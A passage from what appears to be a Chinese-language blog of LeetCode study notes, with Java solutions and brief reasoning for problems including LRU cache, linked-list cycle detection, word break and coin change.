<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxProduct</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxVal</span> <span class="operator">=</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">minVal</span> <span class="operator">=</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> maxVal;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> nums[i];</span><br><span class="line">            <span class="type">int</span> <span class="variable">prevMaxVal</span> <span class="operator">=</span> maxVal;</span><br><span class="line">            maxVal = Integer.max(Integer.max(num, maxVal * num), minVal * num);</span><br><span class="line">            minVal = Integer.min(Integer.min(num, prevMaxVal * num), minVal * num);</span><br><span class="line">            res = Integer.max(res, maxVal);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="148-排序链表"><a href="#148-排序链表" class="headerlink" title="148. 排序链表"></a><a href="https://leetcode.cn/problems/sort-list/">148. 排序链表</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">归并排序合并</span><br></pre></td></tr></table></figure>

<p>递归写法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Definition for singly-linked list.</span><br><span class="line"> * public class ListNode &#123;</span><br><span class="line"> *     int val;</span><br><span class="line"> *     ListNode next;</span><br><span class="line"> *     ListNode() &#123;&#125;</span><br><span class="line"> *     ListNode(int val) &#123; this.val = val; &#125;</span><br><span class="line"> *     ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125;</span><br><span class="line"> * &#125;</span><br><span class="line"> */</span><br><span class="line">class Solution &#123;</span><br><span class="line">    public ListNode sortList(ListNode head) &#123;</span><br><span class="line">        if(head == null || head.next == null) return head;</span><br><span class="line"></span><br><span class="line">        ListNode slow = head;</span><br><span class="line">        ListNode fast = head.next;</span><br><span class="line">        while (fast != null &amp;&amp; fast.next != null)&#123;</span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">        &#125;//head &lt;= slow &lt; tail</span><br><span class="line">        ListNode temp = slow.next;</span><br><span class="line">        slow.next = null;</span><br><span class="line">        ListNode listNode1 = sortList(head);</span><br><span class="line">        ListNode listNode2 = sortList(temp);</span><br><span class="line">        return merge(listNode1, listNode2);</span><br><span class="line">    &#125;</span><br><span class="line">    ListNode merge(ListNode listNode1, ListNode listNode2)&#123;</span><br><span class="line">        ListNode dummyNode = new ListNode();</span><br><span class="line">        ListNode cur = dummyNode;</span><br><span class="line">        ListNode p1 = listNode1;</span><br><span class="line">        ListNode p2 = listNode2;</span><br><span class="line">        while (p1 != null &amp;&amp; p2 != null)&#123;</span><br><span class="line">            if(p1.val &lt;= p2.val)&#123;</span><br><span class="line">                cur.next = p1;</span><br><span class="line">                p1 = p1.next;</span><br><span class="line">            &#125;else &#123;</span><br><span class="line">                cur.next = p2;</span><br><span class="line">                p2 = p2.next;</span><br><span class="line">            &#125;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        while (p1 != null)&#123;</span><br><span class="line">            cur.next = p1;</span><br><span class="line">            p1 = p1.next;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        while (p2 != null)&#123;</span><br><span class="line">            cur.next = p2;</span><br><span class="line">            p2 = p2.next;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        return dummyNode.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>备注</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对于快慢指针，偶数个时，想要让中点在左边，初始化ListNode fast = head.next; 即可。否则初始化为ListNode fast = head;</span><br></pre></td></tr></table></figure>

<p>todo:编写迭代写法</p>
<h3 id="146-LRU-缓存"><a href="#146-LRU-缓存" class="headerlink" title="146. LRU 缓存"></a><a href="https://leetcode.cn/problems/lru-cache/">146. LRU 缓存</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">经典题目一般使用双向链表加hashMap，然后额外添加head和tail</span><br></pre></td></tr></table></figure>

<p>代码一：使用现有轮子完成（直接cv的代码）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">LRUCache</span> <span class="keyword">extends</span> <span class="title class_">LinkedHashMap</span>&lt;Integer, Integer&gt;&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> capacity;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LRUCache</span><span class="params">(<span class="type">int</span> capacity)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(capacity, <span class="number">0.75F</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="built_in">this</span>.capacity = capacity;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> key)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.getOrDefault(key, -<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">(<span class="type">int</span> key, <span class="type">int</span> value)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.put(key, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">removeEldestEntry</span><span class="params">(Map.Entry&lt;Integer, Integer&gt; eldest)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> size() &gt; capacity; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码二：手写LRU</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">LRUCache</span> &#123;</span><br><span class="line"></span><br><span class="line">    Map&lt;Integer, DLinkNode&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    DLinkNode head;</span><br><span class="line">    DLinkNode tail;</span><br><span class="line">    <span class="type">int</span> capacity;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">DLinkNode</span> &#123;</span><br><span class="line">        DLinkNode prev;</span><br><span class="line">        DLinkNode next;</span><br><span class="line">        <span class="type">int</span> value;</span><br><span class="line">        <span class="type">int</span> key;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">DLinkNode</span><span class="params">(DLinkNode prev, DLinkNode next, <span class="type">int</span> value, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.prev = prev;</span><br><span class="line">            <span class="built_in">this</span>.next = next;</span><br><span class="line">            <span class="built_in">this</span>.value = value;</span><br><span class="line">            <span class="built_in">this</span>.key = key;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">DLinkNode</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LRUCache</span><span class="params">(<span class="type">int</span> capacity)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.capacity = capacity;</span><br><span class="line">        head = <span class="keyword">new</span> <span class="title class_">DLinkNode</span>();</span><br><span class="line">        tail = <span class="keyword">new</span> <span class="title class_">DLinkNode</span>();</span><br><span class="line">        head.next = tail;</span><br><span class="line">        tail.prev = head;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(!map.containsKey(key)) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">DLinkNode</span> <span class="variable">dLinkNode</span> <span class="operator">=</span> map.get(key);</span><br><span class="line">        removeNode(dLinkNode);</span><br><span class="line">        makeRecent(dLinkNode);</span><br><span class="line">        <span class="keyword">return</span> dLinkNode.value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">(<span class="type">int</span> key, <span class="type">int</span> value)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(map.containsKey(key))&#123;</span><br><span class="line">            <span class="type">DLinkNode</span> <span class="variable">dLinkNode</span> <span class="operator">=</span> map.get(key);</span><br><span class="line">            <span class="comment">//修改值并且放在head下一位，离head越近越近使用</span></span><br><span class="line">            dLinkNode.value = value;</span><br><span class="line">            removeNode(dLinkNode);</span><br><span class="line">            makeRecent(dLinkNode);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">DLinkNode</span> <span class="variable">addedNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DLinkNode</span>(<span class="literal">null</span>, <span class="literal">null</span>, value, key);</span><br><span class="line">            <span class="comment">//需要移除元素</span></span><br><span class="line">            <span class="keyword">if</span>(map.size() == capacity)&#123;</span><br><span class="line">                <span class="comment">//移除尾部元素并从hashMap去除</span></span><br><span class="line">                <span class="type">DLinkNode</span> <span class="variable">dLinkNode</span> <span class="operator">=</span> removeNode(tail.prev);</span><br><span class="line">                map.remove(dLinkNode.key);</span><br><span class="line">                <span class="comment">//添加元素到头部加到hashMap（可以在抽取函数，懒得抽取了）</span></span><br><span class="line">                makeRecent(addedNode);</span><br><span class="line">                map.put(key, addedNode);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//添加元素到头部</span></span><br><span class="line">                makeRecent(addedNode);</span><br><span class="line">                map.put(key, addedNode);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    DLinkNode <span class="title function_">makeRecent</span><span class="params">(DLinkNode node)</span>&#123;</span><br><span class="line">        <span class="type">DLinkNode</span> <span class="variable">headNext</span> <span class="operator">=</span> head.next;</span><br><span class="line">        head.next = node;</span><br><span class="line">        node.next = headNext;</span><br><span class="line">        node.prev = head;</span><br><span class="line">        headNext.prev = node;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line">    DLinkNode <span class="title function_">removeNode</span><span class="params">(DLinkNode node)</span>&#123;</span><br><span class="line">        <span class="type">DLinkNode</span> <span class="variable">prevNode</span> <span class="operator">=</span> node.prev;</span><br><span class="line">        <span class="type">DLinkNode</span> <span class="variable">nextNode</span> <span class="operator">=</span> node.next;</span><br><span class="line">        node.prev = <span class="literal">null</span>;</span><br><span class="line">        node.next = <span class="literal">null</span>;</span><br><span class="line">        prevNode.next = nextNode;</span><br><span class="line">        nextNode.prev = prevNode;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your LRUCache object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * LRUCache obj = new LRUCache(capacity);</span></span><br><span class="line"><span class="comment"> * int param_1 = obj.get(key);</span></span><br><span class="line"><span class="comment"> * obj.put(key,value);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>感觉水平比以前高了，以前还不会提取方法，现在随便提取。</p>
<h3 id="142-环形链表-II"><a href="#142-环形链表-II" class="headerlink" title="142. 环形链表 II"></a><a href="https://leetcode.cn/problems/linked-list-cycle-ii/">142. 环形链表 II</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">快慢指针。结论题</span><br><span class="line">2k = a + nc + d</span><br><span class="line">k = a + d //慢指针肯定没有走完循环的一圈</span><br><span class="line">-&gt; 2a + 2d = a + nc + d</span><br><span class="line">-&gt; a + d = nc</span><br><span class="line">-&gt; a = nc - d</span><br><span class="line"></span><br><span class="line">a + d + (nc - d) = a + nc恰好</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) &#123;</span></span><br><span class="line"><span class="comment"> *         val = x;</span></span><br><span class="line"><span class="comment"> *         next = null;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">detectCycle</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span> (fast != <span class="literal">null</span> &amp;&amp; fast.next != <span class="literal">null</span>)&#123;</span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            <span class="keyword">if</span>(fast == slow) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(fast == <span class="literal">null</span> || fast.next == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        fast = head;</span><br><span class="line">        <span class="keyword">while</span> (fast != slow)&#123;</span><br><span class="line">            fast = fast.next;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fast;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="141-环形链表"><a href="#141-环形链表" class="headerlink" title="141. 环形链表"></a><a href="https://leetcode.cn/problems/linked-list-cycle/">141. 环形链表</a></h3><p>思路：快慢指针</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) &#123;</span></span><br><span class="line"><span class="comment"> *         val = x;</span></span><br><span class="line"><span class="comment"> *         next = null;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasCycle</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span> (fast != <span class="literal">null</span> &amp;&amp; fast.next != <span class="literal">null</span>)&#123;</span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            <span class="keyword">if</span>(fast == slow) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="20题了"><a href="#20题了" class="headerlink" title="20题了"></a>20题了</h3><h3 id="139-单词拆分"><a href="#139-单词拆分" class="headerlink" title="139. 单词拆分"></a><a href="https://leetcode.cn/problems/word-break/">139. 单词拆分</a></h3><p>思路</p>
<p>感觉可以暴搜，然后可以用首字母开头的hashMap优化</p>
<p>可以dp记录哪些长度是ok的，避免重复计算</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">boolean</span> res;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">        Set&lt;Integer&gt; numLengthSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        Set&lt;String&gt; wordSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(String word)</span>&#123;</span><br><span class="line">            wordSet.add(word);</span><br><span class="line">            numLengthSet.add(word.length());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">wordBreak</span><span class="params">(String s, List&lt;String&gt; wordDict)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">boolean</span>[] dp = <span class="keyword">new</span> <span class="title class_">boolean</span>[n + <span class="number">1</span>];</span><br><span class="line">        Map&lt;Character, Node&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (String word : wordDict) &#123;</span><br><span class="line">            map.computeIfAbsent(word.charAt(<span class="number">0</span>),k -&gt; <span class="keyword">new</span> <span class="title class_">Node</span>()).add(word);</span><br><span class="line">        &#125;</span><br><span class="line">        dfs(s, <span class="number">0</span>, map, dp);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(String s, <span class="type">int</span> i, Map&lt;Character, Node&gt; map, <span class="type">boolean</span>[] dp)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(res || dp[i]) <span class="keyword">return</span>;</span><br><span class="line">        dp[i] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(i == s.length())&#123;</span><br><span class="line">            res = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> s.charAt(i);</span><br><span class="line">        <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> map.get(c);</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">for</span> (Integer wordLength : node.numLengthSet) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i + wordLength &gt; s.length()) <span class="keyword">return</span>;</span><br><span class="line">            <span class="keyword">if</span>(node.wordSet.contains(s.substring(i, i + wordLength)))&#123;</span><br><span class="line">                dfs(s, i + wordLength, map, dp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用时90.43%，内存89.21%</p>
<h3 id="136-只出现一次的数字"><a href="#136-只出现一次的数字" class="headerlink" title="136. 只出现一次的数字"></a><a href="https://leetcode.cn/problems/single-number/">136. 只出现一次的数字</a></h3><p>思路: a^a^b &#x3D; a</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">singleNumber</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num : nums)&#123;</span><br><span class="line">            res ^= num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="647-回文子串"><a href="#647-回文子串" class="headerlink" title="647. 回文子串"></a><a href="https://leetcode.cn/problems/palindromic-substrings/">647. 回文子串</a></h3><p>思路：扩散法</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countSubstrings</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> i;</span><br><span class="line">            <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> i;</span><br><span class="line">            <span class="keyword">while</span> (left &gt;= <span class="number">0</span> &amp;&amp; right &lt; n)&#123;</span><br><span class="line">                <span class="keyword">if</span>(s.charAt(left) != s.charAt(right)) <span class="keyword">break</span>;</span><br><span class="line">                res++;</span><br><span class="line">                left--;</span><br><span class="line">                right++;</span><br><span class="line">            &#125;</span><br><span class="line">            left = i - <span class="number">1</span>;</span><br><span class="line">            right = i;</span><br><span class="line">            <span class="keyword">while</span> (left &gt;= <span class="number">0</span> &amp;&amp; right &lt; n)&#123;</span><br><span class="line">                <span class="keyword">if</span>(s.charAt(left) != s.charAt(right)) <span class="keyword">break</span>;</span><br><span class="line">                res++;</span><br><span class="line">                left--;</span><br><span class="line">                right++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路二：Manacher 算法</p>
<p><a href="https://blog.csdn.net/qq_43456058/article/details/94588721">彻底搞懂马拉车（Manacher）-CSDN博客</a></p>
<p><a href="https://www.bilibili.com/video/BV1LC41147Lh/?spm_id_from=333.337.search-card.all.click&vd_source=d1cb46e12f3981bbb347ae0eb3b44edd">算法讲解104【扩展】 Manacher算法相关题目_哔哩哔哩_bilibili</a></p>
<p>todo：学懂然后手写马拉车算法系列题目</p>
<h3 id="128-最长连续序列"><a href="#128-最长连续序列" class="headerlink" title="128. 最长连续序列"></a><a href="https://leetcode.cn/problems/longest-consecutive-sequence/">128. 最长连续序列</a></h3><p>思路：要求o(n)，因此不能排序。又每个数都可能是最长序列一部分，因此需要记录下来每个数。两个考虑桶、set。这里使用set来做。</p>
<p>遍历set，对于x 属于 set，先判断x-1在不在，在就跳过，不在就计算</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Set&lt;Integer&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">    set.add(num);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (Integer num : set) &#123;</span><br><span class="line">    <span class="keyword">if</span>(set.contains(num - <span class="number">1</span>)) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> num + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (set.contains(right))&#123;</span><br><span class="line">        right++;</span><br><span class="line">    &#125;</span><br><span class="line">    res = Integer.max(res, right - num);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br></pre></td></tr></table></figure>

<p>时间复杂度分析：有个双重循环，但每个元素最多会被遍历两次</p>
<h3 id="124-二叉树中的最大路径和"><a href="#124-二叉树中的最大路径和" class="headerlink" title="124. 二叉树中的最大路径和"></a><a href="https://leetcode.cn/problems/binary-tree-maximum-path-sum/">124. 二叉树中的最大路径和</a></h3><p>思路：先分析遍历顺序，后序遍历（需要两边状态）。在定义返回值为包含结点的非拐弯路径最大值(负数就为0)</p>
<p>伪代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int left = travel(root.left);</span><br><span class="line">int right = travel(root.right);</span><br><span class="line">ans = max(ans, root.val + left + right);</span><br><span class="line">return max(root.val + left, root.val + right,0)</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> Integer.MIN_VALUE;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxPathSum</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        travel(root);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">travel</span><span class="params">(TreeNode root)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> travel(root.left);</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> travel(root.right);</span><br><span class="line">        ans = Integer.max(ans, left + right + root.val);</span><br><span class="line">        <span class="type">int</span> <span class="variable">retVal</span> <span class="operator">=</span> Integer.max(left, right) + root.val;</span><br><span class="line">        <span class="keyword">return</span> retVal &lt; <span class="number">0</span> ? <span class="number">0</span> : retVal;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="322-零钱兑换"><a href="#322-零钱兑换" class="headerlink" title="322. 零钱兑换"></a><a href="https://leetcode.cn/problems/coin-change/">322. 零钱兑换</a></h3><p>思路：动态规划，其实这题就是背包价值都为1，容量为面额，要求价值最少</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">coinChange</span><span class="params">(<span class="type">int</span>[] coins, <span class="type">int</span> amount)</span> &#123;</span><br><span class="line">        <span class="comment">//dp[i][j] = min(dp[i][j- num] + 1, dp[i][j])</span></span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[amount + <span class="number">1</span>];</span><br><span class="line">        Arrays.fill(dp, Integer.MAX_VALUE / <span class="number">2</span>);</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">curAmount</span> <span class="operator">=</span> <span class="number">1</span>; curAmount &lt;= amount; curAmount++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> coin : coins) &#123;</span><br><span class="line">                <span class="keyword">if</span>(curAmount &gt;= coin)&#123;</span><br><span class="line">                    dp[curAmount] = Integer.min(dp[curAmount], <span class="number">1</span> + dp[curAmount - coin]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[amount] &gt; <span class="number">10000</span> ? -<span class="number">1</span> : dp[amount];        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="494-目标和"><a href="#494-目标和" class="headerlink" title="494. 目标和"></a><a href="https://leetcode.cn/problems/target-sum/">494. 目标和</a></h3><p>思路：其实问题也是背包问题。记数组总数为sum。加法的值为 add 则减法值为sum -add</p>
<p>也即 add  -  (sum - add) &#x3D; target。也即 add * 2 &#x3D; target + sum</p>
